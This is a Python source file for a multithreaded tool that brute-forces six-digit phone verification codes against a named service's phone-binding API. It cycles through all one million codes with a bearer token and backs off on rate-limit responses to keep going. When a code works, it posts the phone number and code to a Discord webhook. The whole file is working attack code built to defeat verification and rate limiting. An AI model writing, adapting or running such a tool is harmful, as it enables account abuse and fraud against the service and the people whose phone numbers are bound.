import threading
import time
import random
import queue
import requests

class RequestWorker(threading.Thread):
    def __init__(self, account_id, account_data, discord_webhook_url, num_threads, base_delay, output_callback, stop_event):
        super().__init__()
        self.account_id = account_id
        self.bearer = account_data.get("bearer")
        self.phone_number = account_data.get("phone")
        self.region_code = account_data.get("region_code", "+1")
        self.discord_webhook_url = discord_webhook_url
        self.num_threads = num_threads
        self.base_delay = base_delay
        self.output_callback = output_callback
        self.stop_event = stop_event

        self.url = "https://api.manus.im/user.v1.UserService/BindPhoneTrait"
        self.queue = queue.Queue()
        self.request_counter = 0
        self.lock = threading.Lock()
        self.start_time = time.time()

        self.headers = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "authorization": f"Bearer {self.bearer}",
            "connect-protocol-version": "1",
            "content-type": "application/json",
            "x-client-id": "hfXweh3rzOTbzQ9woM9okV",
            "x-client-locale": "en",
            "x-client-timezone": "America/Denver",
            "x-client-timezone-offset": "360",
            "x-client-type": "web"
        }

        all_codes = [f"{i:06d}" for i in range(1000000)]
        random.shuffle(all_codes)
        for code in all_codes:
            self.queue.put(code)

        self._last_429_times = []
        self._current_delay = base_delay

    def send_discord_success(self, code_str):
        embed = {
            "title": "✅ Successful Code Found",
            "color": 0x00FF00,
            "fields": [
                {"name": "Phone Number", "value": self.phone_number, "inline": True},
                {"name": "Region Code", "value": self.region_code, "inline": True},
                {"name": "Code", "value": code_str, "inline": True},
                {"name": "Time", "value": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()), "inline": False},
            ]
        }
        data = {"embeds": [embed]}
        try:
            requests.post(self.discord_webhook_url, json=data, timeout=10)
        except Exception as e:
            self.output_callback(f"[{self.account_id}] Failed to send Discord webhook: {e}")

    def update_delay_on_429(self):
        now = time.time()
        self._last_429_times = [t for t in self._last_429_times if now - t <= 30]
        self._last_429_times.append(now)
        self._current_delay = min(self._current_delay * 2, 30)  # cap delay at 30s

    def reset_delay_if_no_429(self):
        now = time.time()
        self._last_429_times = [t for t in self._last_429_times if now - t <= 30]
        if not self._last_429_times:
            self._current_delay = self.base_delay

    # Note: The original print_status method had global variable dependencies (request_counter, start_time, lock)
    # These are instance variables in this class (self.request_counter, self.start_time, self.lock)
    # and the output is handled by self.output_callback. 
    # This version of print_status is simplified to use the output_callback.
    def print_status(self, req_num, code_str, status, error_text=""):
        # This method is called from worker_thread, which has access to self.
        # The original print_status was a static method or a free function, which is not ideal here.
        # We will adapt it to use self.output_callback for progress reporting.
        # The progress bar logic might need to be handled by the GUI if it's complex.
        # For now, we'll send a simple status message.
        elapsed = time.time() - self.start_time
        avg_speed = self.request_counter / elapsed if elapsed > 0 else 0
        status_msg = f"Req #{req_num} | Code: {code_str} | Status: {status} | Avg speed: {avg_speed:.1f} req/s"
        if error_text:
            status_msg += f" | Error: {error_text}"
        # The original code used a global lock and print for console updates.
        # We'll use the output_callback, assuming it handles GUI updates correctly.
        # The 'replace=True' functionality of the original output method needs to be handled by the GUI's output_callback.
        self.output_callback(f"[{self.account_id}] {status_msg}", replace=True) 

    def worker_thread(self):
        while not self.stop_event.is_set():
            try:
                code_str = self.queue.get_nowait()
            except queue.Empty:
                break

            with self.lock:
                self.request_counter += 1
                current_request = self.request_counter

            payload = {
                "phoneNumber": self.phone_number,
                "regionCode": self.region_code,
                "phoneVerifyCode": code_str
            }

            try:
                response = requests.post(self.url, headers=self.headers, json=payload, timeout=10)
                status_code = response.status_code
                text = response.text.strip().replace('\n', ' ')[:120]

                if status_code == 429:
                    self.update_delay_on_429()
                else:
                    self.reset_delay_if_no_429()
                
                # Use the instance method for print_status
                self.print_status(current_request, code_str, status_code, "" if status_code == 200 else text)

                if status_code == 200 and "success" in response.text.lower():
                    self.output_callback(f"\n✅ [{self.account_id}] Success with code {code_str} after {current_request} requests and {time.time() - self.start_time:.1f}s.")
                    self.send_discord_success(code_str)
                    self.stop_event.set()
                    break
            except Exception as e:
                self.print_status(current_request, code_str, "ERR", str(e))

            if self.stop_event.is_set():
                break

            time.sleep(self._current_delay)
            self.queue.task_done()

    def run(self):
        threads = []
        for _ in range(self.num_threads):
            t = threading.Thread(target=self.worker_thread)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        if not self.stop_event.is_set():
            self.output_callback(f"\n[{self.account_id}] All codes tried without success.")

